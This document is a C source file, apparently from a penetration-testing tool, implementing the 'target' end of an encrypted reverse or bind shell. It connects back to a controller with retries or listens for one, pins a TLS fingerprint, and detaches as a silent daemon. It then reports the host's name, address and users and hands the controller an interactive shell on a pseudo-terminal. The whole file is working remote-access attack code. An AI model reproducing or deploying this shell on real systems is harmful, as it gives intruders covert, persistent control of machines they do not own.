
#include "common.h"



int do_target(struct remote_io_helper *io, struct configuration_helper *config){


	int i;
	int retval;

	char *pty_name;
	int pty_master, pty_slave;

	char **exec_argv;
	char **exec_envp;
	char **tmp_vector;

	int buff_len, tmp_len;
	char *buff_head = NULL, *buff_tail;

	int io_bytes;

	struct winsize *tty_winsize;

	char tmp_char;

	unsigned int tmp_uint;

	BIO *accept = NULL;

	struct passwd *passwd_entry;

#include "keys/target_key.c"
	int target_key_len = sizeof(target_key);

#include "keys/target_cert.c"
	int target_cert_len = sizeof(target_cert);

#include "keys/controller_fingerprint.c"
	char *remote_fingerprint_str;

	X509 *remote_cert;
	unsigned int remote_fingerprint_len;
	unsigned char remote_fingerprint[EVP_MAX_MD_SIZE];

	const SSL_CIPHER *current_cipher;

	struct sockaddr addr;
	socklen_t addrlen = (socklen_t) sizeof(addr);

	unsigned int retry;

	struct sigaction *act = NULL;

  struct timespec req;



	buff_len = getpagesize();
	if((buff_head = (char *) calloc(buff_len, sizeof(char))) == NULL){
		fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				buff_len, (int) sizeof(char), \
				strerror(errno));
		exit(-1);
	}


	if((tty_winsize = (struct winsize *) calloc(1, sizeof(struct winsize))) == NULL){
		fprintf(stderr, "%s: %d: calloc(1, %d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				(int) sizeof(struct winsize), strerror(errno));
		exit(-1);
	}


	memset(remote_fingerprint, 0, EVP_MAX_MD_SIZE);
	remote_fingerprint_len = 0;

  if((act = (struct sigaction *) calloc(1, sizeof(struct sigaction))) == NULL){
    fprintf(stderr, "%s: %d: calloc(1, %d): %s\r\n", \
        program_invocation_short_name, io->controller, \
        (int) sizeof(struct sigaction), strerror(errno));
    exit(-1);
  }



	/*  Note: We will make heavy use of #ifdef DEBUG here. I don't want to *ever* accidentally */
	/*	print to the remote host. We can do so if debugging, but otherwise just fail silently. */
	/*	Once the connection is open, we will try to shove errors down the socket, but otherwise */
	/*	fail silently. */


	/*  - Setup SSL. */
	if(config->encryption){

		if((io->ctx = SSL_CTX_new(TLSv1_client_method())) == NULL){
#ifdef DEBUG
			fprintf(stderr, "%s: %d: SSL_CTX_new(TLSv1_client_method()): %s\n", \
					program_invocation_short_name, io->controller, strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		/*  Because the controller host will normally dictate which crypto to use, in bind shell mode */
		/*  we will want to restrict this to only EDH from the target host. Otherwise the bind shell may */
		/*  serve a shell to any random hacker that knows how to port scan. */
		if(config->bindshell){
			config->cipher_list = CONTROLLER_CIPHER;
		}else{
			config->cipher_list = TARGET_CIPHER;
		}

		if(SSL_CTX_set_cipher_list(io->ctx, config->cipher_list) != 1){
#ifdef DEBUG
			fprintf(stderr, "%s: %d: SSL_CTX_set_cipher_list(%lx, %s): %s\n", \
					program_invocation_short_name, io->controller, (unsigned long) io->ctx, config->cipher_list, strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		SSL_CTX_set_verify(io->ctx, SSL_VERIFY_PEER, dummy_verify_callback);

		if(SSL_CTX_use_certificate_ASN1(io->ctx, target_cert_len, target_cert) != 1){
#ifdef DEBUG
			fprintf(stderr, "%s: %d: SSL_CTX_use_certificate_ASN1(%lx, %d, %lx): %s\n", \
					program_invocation_short_name, io->controller, (unsigned long) io->ctx, target_cert_len, (unsigned long) target_cert, strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		if(SSL_CTX_use_RSAPrivateKey_ASN1(io->ctx, target_key, target_key_len) != 1){
#ifdef DEBUG
			fprintf(stderr, "%s: %d: SSL_CTX_use_RSAPrivateKey_ASN1(%lx, %lx, %d): %s\n", \
					program_invocation_short_name, io->controller, (unsigned long) io->ctx, (unsigned long) target_key, target_key_len, strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		if(SSL_CTX_check_private_key(io->ctx) != 1){
#ifdef DEBUG
			fprintf(stderr, "%s: %d: SSL_CTX_check_private_key(%lx): %s\n", \
					program_invocation_short_name, io->controller, (unsigned long) io->ctx, strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}
	}

	act->sa_handler = catch_alarm;

	if(sigaction(SIGALRM, act, NULL) == -1){
#ifdef DEBUG
		fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
				program_invocation_short_name, io->controller, \
				SIGALRM, (unsigned long) act, NULL, strerror(errno));
#endif
		exit(-1);
	}

	alarm(config->timeout);

	if(config->bindshell){
		/*  - Listen for a connection. */

		if(config->keepalive){
			if(signal(SIGCHLD, SIG_IGN) == SIG_ERR){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: signal(SIGCHLD, SIG_IGN): %s\n", \
						program_invocation_short_name, io->controller, strerror(errno));
#endif
				exit(-1);
			}
		}

		do{
#ifdef DEBUG
			printf("Listening on %s...", config->ip_addr);
			fflush(stdout);
#endif

			if(accept){
				BIO_free(accept);
				alarm(config->timeout);
			}

			if((accept = BIO_new_accept(config->ip_addr)) == NULL){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: BIO_new_accept(%s): %s\n", \
						program_invocation_short_name, io->controller, config->ip_addr, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			if(BIO_set_bind_mode(accept, BIO_BIND_REUSEADDR) <= 0){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: BIO_set_bind_mode(%lx, BIO_BIND_REUSEADDR): %s\n", \
						program_invocation_short_name, io->controller, (unsigned long) accept, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			if(BIO_do_accept(accept) <= 0){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
						program_invocation_short_name, io->controller, (unsigned long) accept, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			if(BIO_do_accept(accept) <= 0){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
						program_invocation_short_name, io->controller, (unsigned long) accept, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			if((io->connect = BIO_pop(accept)) == NULL){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: BIO_pop(%lx): %s\n", \
						program_invocation_short_name, io->controller, (unsigned long) accept, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			BIO_free(accept);

			retval = 0;
			if(config->keepalive){
				if((retval = fork()) == -1){
#ifdef DEBUG
					fprintf(stderr, "%s: %d: fork(): %s\n", \
							program_invocation_short_name, io->controller, strerror(errno));
					ERR_print_errors_fp(stderr);
#endif
					exit(-1);
				}
			}

		} while(config->keepalive && retval);

		if(config->keepalive){
			if(signal(SIGCHLD, SIG_DFL) == SIG_ERR){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: signal(SIGCHLD, SIG_IGN): %s\n", \
						program_invocation_short_name, io->controller, strerror(errno));
#endif
				exit(-1);
			}
		}


	}else{

		/*  - Open a network connection back to a controller. */
		if((io->connect = BIO_new_connect(config->ip_addr)) == NULL){
#ifdef DEBUG
			fprintf(stderr, "%s: %d: BIO_new_connect(%s): %s\n", \
					program_invocation_short_name, io->controller, config->ip_addr, strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		if(config->verbose){
			printf("Connecting to %s...", config->ip_addr);
			fflush(stdout);
		}

		while(((retval = BIO_do_connect(io->connect)) != 1) && config->retry_start){

			/*  Using RAND_pseudo_bytes() instead of RAND_bytes() because this is a best effort. We don't */
			/*  actually want to die or print an error if there is a lack of entropy. */
			if(config->retry_stop){
				RAND_pseudo_bytes((unsigned char *) &tmp_uint, sizeof(tmp_uint));
				retry = config->retry_start + (tmp_uint % (config->retry_stop - config->retry_start));
			}else{
				retry = config->retry_start;
			}

			if(config->verbose){
				printf("No connection.\r\nRetrying in %d seconds...\r\n", retry);
			}

			req.tv_sec = retry;
			req.tv_nsec = 0;
			nanosleep(&req, NULL);

			if(config->verbose){
				printf("Connecting to %s...", config->ip_addr);
				fflush(stdout);
			}
		}

		if(retval != 1){
#ifdef DEBUG
			fprintf(stderr, "%s: %d: BIO_do_connect(%lx): %s\n", \
					program_invocation_short_name, io->controller, (unsigned long) io->connect, strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}
	}

	act->sa_handler = SIG_DFL;

	if(sigaction(SIGALRM, act, NULL) == -1){
#ifdef DEBUG
		fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
				program_invocation_short_name, io->controller, \
				SIGALRM, (unsigned long) act, NULL, strerror(errno));
#endif
		exit(-1);
	}

	alarm(0);

	if(config->verbose){
		printf("\tConnected!\r\n");
	}

	if(BIO_get_fd(io->connect, &(io->remote_fd)) < 0){
#ifdef DEBUG
		fprintf(stderr, "%s: %d: BIO_get_fd(%lx, %lx): %s\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io->connect, (unsigned long) &(io->remote_fd), strerror(errno));
		ERR_print_errors_fp(stderr);
#endif
		exit(-1);
	}

	if(config->encryption > PLAINTEXT){

		if(!(io->ssl = SSL_new(io->ctx))){
#ifdef DEBUG
			fprintf(stderr, "%s: %d: SSL_new(%lx): %s\n", \
					program_invocation_short_name, io->controller, (unsigned long) io->ctx, strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		SSL_set_bio(io->ssl, io->connect, io->connect);

		if(SSL_connect(io->ssl) < 1){
#ifdef DEBUG
			fprintf(stderr, "%s: %d: SSL_connect(%lx): %s\n", \
					program_invocation_short_name, io->controller, (unsigned long) io->ssl, strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		if((current_cipher = SSL_get_current_cipher(io->ssl)) == NULL){
#ifdef DEBUG
			fprintf(stderr, "%s: %d: SSL_get_current_cipher(%lx): No cipher set!\n", \
					program_invocation_short_name, io->controller, (unsigned long) io->ssl);
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		if(!strcmp(current_cipher->name, EDH_CIPHER)){

			if((remote_cert = SSL_get_peer_certificate(io->ssl)) == NULL){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: SSL_get_peer_certificate(%lx): %s\n", \
						program_invocation_short_name, io->controller, (unsigned long) io->ssl, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			if(!X509_digest(remote_cert, io->fingerprint_type, remote_fingerprint, &remote_fingerprint_len)){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: X509_digest(%lx, %lx, %lx, %lx): %s\n", \
						program_invocation_short_name, io->controller, \
						(unsigned long) remote_cert, \
						(unsigned long) io->fingerprint_type, \
						(unsigned long) remote_fingerprint, \
						(unsigned long) &remote_fingerprint_len, \
						strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			if((remote_fingerprint_str = (char *) calloc(strlen(controller_cert_fingerprint) + 1, sizeof(char))) == NULL){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
						program_invocation_short_name, io->controller, (int) strlen(controller_cert_fingerprint) + 1, (int) sizeof(char), \
						strerror(errno));
#endif
				exit(-1);
			}

			for(i = 0; i < (int) remote_fingerprint_len; i++){
				sprintf(remote_fingerprint_str + (i * 2), "%02x", remote_fingerprint[i]);
			}

			if(strncmp(controller_cert_fingerprint, remote_fingerprint_str, strlen(controller_cert_fingerprint))){
#ifdef DEBUG
				fprintf(stderr, "Remote fingerprint expected:\n\t%s\n", controller_cert_fingerprint);
				fprintf(stderr, "Remote fingerprint received:\n\t%s\n", remote_fingerprint_str);
				fprintf(stderr, "%s: %d: Fingerprint mistmatch. Possible mitm. Aborting!\n", \
						program_invocation_short_name, io->controller);
#endif
				exit(-1);
			}

			free(remote_fingerprint_str);
		}
	}


	/*  - Agree on interactive / non-interactive mode. */
	memset(buff_head, 0, buff_len);
	buff_tail = buff_head;
	*(buff_tail++) = (char) APC;
	*(buff_tail++) = (char) config->interactive;
	*(buff_tail) = (char) ST;

	if((io_bytes = io->remote_write(io, buff_head, HANDSHAKE_LEN)) == -1){
		fprintf(stderr, "%s: %d: io->remote_write(%lx, %lx, %d): %s\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, HANDSHAKE_LEN, strerror(errno));
		exit(-1);
	}

	if(io_bytes != HANDSHAKE_LEN){
		fprintf(stderr, "%s: %d: io->remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, HANDSHAKE_LEN);
		exit(-1);
	}

	memset(buff_head, 0, buff_len);
	buff_tail = buff_head;
	if((io_bytes = io->remote_read(io, buff_tail, HANDSHAKE_LEN)) == -1){
		fprintf(stderr, "%s: %d: io->remote_read(%lx, %lx, %d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_tail, HANDSHAKE_LEN, strerror(errno));
		exit(-1);
	}

	if(io_bytes != HANDSHAKE_LEN){
		fprintf(stderr, "%s: %d: io->remote_read(%lx, %lx, %d): Unable to write entire string.\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_tail, HANDSHAKE_LEN);
		exit(-1);
	}

	if(!buff_head[1]){
		config->interactive = 0;
	}

	if(!config->interactive){
		retval = broker(io, config);

		if(config->encryption){
			SSL_shutdown(io->ssl);
			SSL_free(io->ssl);
			SSL_CTX_free(io->ctx);
		}

		return(retval);
	}


#ifndef DEBUG

	/*  - Become a daemon. */
	umask(0);

	retval = fork();


	if(retval == -1){
		exit(-1);
	}else if(retval){
		exit(0);
	}

	if(setsid() == -1){
		exit(-1);
	}

	if(chdir("/") == -1){
		exit(-1);
	}

#endif


	/*  - Receive and set the shell. */
	if(io->remote_read(io, &tmp_char, 1) == -1){
		print_error(io, "%s: %d: io->remote_read(%lx, %lx, %d): %s\r\n", \
				program_invocation_short_name, io->controller, (unsigned long) io, (unsigned long) &tmp_char, 1, strerror(errno));
		exit(-1);
	}

	if(tmp_char != (char) APC){
		print_error(io, "%s: %d: invalid initialization: shell\r\n", program_invocation_short_name, io->controller);
		exit(-1);
	}

	memset(buff_head, 0, buff_len);
	buff_tail = buff_head;

	if(io->remote_read(io, &tmp_char, 1) == -1){
		print_error(io, "%s: %d: io->remote_read(%lx, %lx, 1): %s\r\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) &tmp_char, strerror(errno));
		exit(-1);
	}

	while(tmp_char != (char) ST){
		*(buff_tail++) = tmp_char;

		if((buff_tail - buff_head) >= buff_len){
			print_error(io, "%s: %d: Shell string too long.\r\n", \
					program_invocation_short_name, io->controller);
			exit(-1);
		}

		if(io->remote_read(io, &tmp_char, 1) == -1){
			print_error(io, "%s: %d: io->remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io->controller, \
					(unsigned long) io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}
	}

	tmp_len = strlen(buff_head);

	if(!tmp_len){
		if(config->shell){
			tmp_len = strlen(config->shell);
			memcpy(buff_head, config->shell, tmp_len);
		}else{
			tmp_len = strlen(DEFAULT_SHELL);
			memcpy(buff_head, DEFAULT_SHELL, tmp_len);
		}
	}

	if((config->shell = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
		print_error(io, "%s: %d: calloc(%d, %d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				tmp_len + 1, (int) sizeof(char), strerror(errno));
		exit(-1);
	}
	memcpy(config->shell, buff_head, tmp_len);


	/*  - Receive and set the initial environment. */
	if(io->remote_read(io, &tmp_char, 1) == -1){
		print_error(io, "%s: %d: io->remote_read(%lx, %lx, 1): %s\r\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) &tmp_char, strerror(errno));
		exit(-1);
	}

	if(tmp_char != (char) APC){
		print_error(io, "%s: %d: invalid initialization: environment\r\n", \
				program_invocation_short_name, io->controller);
		exit(-1);
	}

	memset(buff_head, 0, buff_len);
	buff_tail = buff_head;

	if(io->remote_read(io, &tmp_char, 1) == -1){
		print_error(io, "%s: %d: io->remote_read(%lx, %lx, 1): %s\r\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) &tmp_char, strerror(errno));
		exit(-1);
	}

	while(tmp_char != (char) ST){
		*(buff_tail++) = tmp_char;

		if((buff_tail - buff_head) >= buff_len){
			print_error(io, "%s: %d: Environment string too long.\r\n", \
					program_invocation_short_name, io->controller);
			exit(-1);
		}

		if(io->remote_read(io, &tmp_char, 1) == -1){
			print_error(io, "%s: %d: io->remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io->controller, \
					(unsigned long) io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}
	}

	if((exec_envp = string_to_vector(buff_head)) == NULL){
		print_error(io, "%s: %d: string_to_vector(%s): %s\r\n", \
				program_invocation_short_name, io->controller, \
				buff_head, strerror(errno));
		exit(-1);
	}

	/*  - Receive and set the initial termios. */
	if(io->remote_read(io, &tmp_char, 1) == -1){
		print_error(io, "%s: %d: io->remote_read(%lx, %lx, 1): %s\r\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) &tmp_char, strerror(errno));
		exit(-1);
	}

	if(tmp_char != (char) APC){
		print_error(io, "%s: %d: invalid initialization: termios\r\n", \
				program_invocation_short_name, io->controller);
		exit(-1);
	}

	memset(buff_head, 0, buff_len);
	buff_tail = buff_head;

	if(io->remote_read(io, &tmp_char, 1) == -1){
		print_error(io, "%s: %d: io->remote_read(%lx, %lx, 1): %s\r\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) &tmp_char, strerror(errno));
		exit(-1);
	}

	while(tmp_char != (char) ST){
		*(buff_tail++) = tmp_char;

		if((buff_tail - buff_head) >= buff_len){
			print_error(io, "%s: %d: termios string too long.\r\n", \
					program_invocation_short_name, io->controller);
			exit(-1);
		}

		if(io->remote_read(io, &tmp_char, 1) == -1){
			print_error(io, "%s: %d: io->remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io->controller, \
					(unsigned long) io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}
	}

	if((tmp_vector = string_to_vector(buff_head)) == NULL){
		print_error(io, "%s: %d: string_to_vector(%s): %s\r\n", \
				program_invocation_short_name, io->controller, \
				strerror(errno));
		exit(-1);
	}

	if(tmp_vector[0] == NULL){
		print_error(io, "%s: %d: invalid initialization: tty_winsize->ws_row\r\n", \
				program_invocation_short_name, io->controller);
		exit(-1);
	}

	errno = 0;
	tty_winsize->ws_row = strtol(tmp_vector[0], NULL, 10);
	if(errno){
		print_error(io, "%s: %d: strtol(%s): %s\r\n", \
				program_invocation_short_name, io->controller, \
				strerror(errno));
		exit(-1);
	}

	if(tmp_vector[1] == NULL){
		print_error(io, "%s: %d: invalid initialization: tty_winsize->ws_col\r\n", \
				program_invocation_short_name, io->controller);
		exit(-1);
	}

	errno = 0;
	tty_winsize->ws_col = strtol(tmp_vector[1], NULL, 10);
	if(errno){
		print_error(io, "%s: %d: strtol(%s): %s\r\n", \
				program_invocation_short_name, io->controller, \
				strerror(errno));
		exit(-1);
	}

	/*  - Create a pseudo-terminal (pty). */
	if((pty_master = posix_openpt(O_RDWR|O_NOCTTY)) == -1){
		print_error(io, "%s: %d: posix_openpt(O_RDWR|O_NOCTTY): %s\r\n", \
				program_invocation_short_name, io->controller, \
				strerror(errno));
		exit(-1);
	}

	if(grantpt(pty_master) == -1){
		print_error(io, "%s: %d: grantpt(%d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_master, strerror(errno));
		exit(-1);
	}

	if(unlockpt(pty_master) == -1){
		print_error(io, "%s: %d: unlockpt(%d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_master, strerror(errno));
		exit(-1);
	}

	if(ioctl(pty_master, TIOCSWINSZ, tty_winsize) == -1){
		print_error(io, "%s: %d: ioctl(%d, %d, %lx): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_master, TIOCGWINSZ, (unsigned long) tty_winsize, strerror(errno));
		exit(-1);
	}

	if((pty_name = ptsname(pty_master)) == NULL){
		print_error(io, "%s: %d: ptsname(%d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_master, strerror(errno));
		exit(-1);
	}

	if((pty_slave = open(pty_name, O_RDWR|O_NOCTTY)) == -1){
		print_error(io, "%s: %d: open(%s, O_RDWR|O_NOCTTY): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_name, strerror(errno));
		exit(-1);
	}

	/*  - Send basic information back to the controller about the connecting host. */
	memset(buff_head, 0, buff_len);
	if(gethostname(buff_head, buff_len - 1) == -1){
		print_error(io, "%s: %d: gethostname(%lx, %d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) buff_head, buff_len - 1, strerror(errno));
		exit(-1);
	}

	remote_printf(io, "################################\r\n");
	remote_printf(io, "# hostname: %s\r\n", buff_head);


	remote_printf(io, "# ip address: ");
	if(getsockname(io->remote_fd, &addr, &addrlen) != -1){
		memset(buff_head, 0, buff_len);
		if(inet_ntop(addr.sa_family, addr.sa_data + 2, buff_head, buff_len - 1)){
			remote_printf(io, "%s", buff_head);
		}
	}

	if(!buff_head[0]){
		remote_printf(io, "I have no address!");
	}
	remote_printf(io, "\r\n");

	/*  if the uid doesn't match an entry in /etc/passwd, we don't want to crash. */
	/*  Borrowed the "I have no name!" convention from bash. */
	passwd_entry = getpwuid(getuid());
	remote_printf(io, "# real user: ");
	if(passwd_entry && passwd_entry->pw_name){
		remote_printf(io, "%s", passwd_entry->pw_name);
	}else{
		remote_printf(io, "I have no name!");
	}
	remote_printf(io, "\r\n");

	passwd_entry = getpwuid(geteuid());
	remote_printf(io, "# effective user: ");
	if(passwd_entry && passwd_entry->pw_name){
		remote_printf(io, "%s", passwd_entry->pw_name);
	}else{
		remote_printf(io, "I have no name!");
	}
	remote_printf(io, "\r\n");

	remote_printf(io, "################################\r\n");

	free(buff_head);

	if(close(STDIN_FILENO) == -1){
		print_error(io, "%s: %d: close(STDIN_FILENO): %s\r\n", \
				program_invocation_short_name, io->controller, \
				strerror(errno));
		exit(-1);
	}

	if(close(STDOUT_FILENO) == -1){
		print_error(io, "%s: %d: close(STDOUT_FILENO): %s\r\n", \
				program_invocation_short_name, io->controller, \
				strerror(errno));
		exit(-1);
	}

#ifndef DEBUG

	if(close(STDERR_FILENO) == -1){
		print_error(io, "%s: %d: close(STDERR_FILENO): %s\r\n", \
				program_invocation_short_name, io->controller, \
				strerror(errno));
		exit(-1);
	}
#endif

	/*  - Fork a child to run the shell. */
	retval = fork();

	if(retval == -1){
		print_error(io, "%s: %d: fork(): %s\r\n", \
				program_invocation_short_name, io->controller, \
				strerror(errno));
		exit(-1);
	}

	if(retval){

		/*  - Parent: Enter broker() and broker tty. */
		if(close(pty_slave) == -1){
			print_error(io, "%s: %d: close(%d): %s\r\n", \
					program_invocation_short_name, io->controller, \
					pty_slave, strerror(errno));
			exit(-1);
		}

		io->local_in_fd = pty_master;
		io->local_out_fd = pty_master;

		retval = broker(io, config);

		if(retval == -1){
			print_error(io, "%s: %d: broker(%lx, %lx): %s\r\n", \
					program_invocation_short_name, io->controller, \
					(unsigned long) io, (unsigned long) config, strerror(errno));
			exit(-1);
		}

		if(config->encryption){
			SSL_shutdown(io->ssl);
			SSL_free(io->ssl);
			SSL_CTX_free(io->ctx);
		}

		return(0);
	}

	/*  - Child: Initialize file descriptors. */
	if(close(pty_master) == -1){
		print_error(io, "%s: %d: close(%d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_master, strerror(errno));
		exit(-1);
	}
	if(dup2(pty_slave, STDIN_FILENO) == -1){
		print_error(io, "%s: %d: dup2(%d, STDIN_FILENO): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_slave, strerror(errno));
		exit(-1);
	}

	if(dup2(pty_slave, STDOUT_FILENO) == -1){
		print_error(io, "%s: %d: dup2(%d, STDOUT_FILENO): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_slave, strerror(errno));
		exit(-1);
	}

	if(dup2(pty_slave, STDERR_FILENO) == -1){
		print_error(io, "%s: %d: dup2(%d, %d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_slave, STDERR_FILENO, strerror(errno));
		exit(-1);
	}

	if(close(io->remote_fd) == -1){
		print_error(io, "%s: %d: close(%d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				io->remote_fd, strerror(errno));
		exit(-1);
	}

	if(close(pty_slave) == -1){
		print_error(io, "%s: %d: close(%d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_slave, strerror(errno));
		exit(-1);
	}

	if(setsid() == -1){
		print_error(io, "%s: %d: setsid(): %s\r\n", \
				program_invocation_short_name, io->controller, \
				strerror(errno));
		exit(-1);
	} 

	/*  - Child: Set the pty as controlling. */
	if(ioctl(STDIN_FILENO, TIOCSCTTY, 1) == -1){
		print_error(io, "%s: %d: ioctl(STDIN_FILENO, TIOCSCTTY, 1): %s\r\n", \
				program_invocation_short_name, io->controller, \
				strerror(errno));
		exit(-1);
	}

	/*  - Child: Call execve() to invoke a shell. */
	errno = 0;
	if((exec_argv = string_to_vector(config->shell)) == NULL){
		print_error(io, "%s: %d: string_to_vector(%s): %s\r\n", \
				program_invocation_short_name, io->controller, \
				config->shell, strerror(errno));
		exit(-1);
	}

	free(config->shell);

	execve(exec_argv[0], exec_argv, exec_envp);
	print_error(io, "%s: %d: execve(%s, %lx, NULL): Shouldn't be here!\r\n", \
			program_invocation_short_name, io->controller, \
			exec_argv[0], (unsigned long) exec_argv);

	return(-1);
}
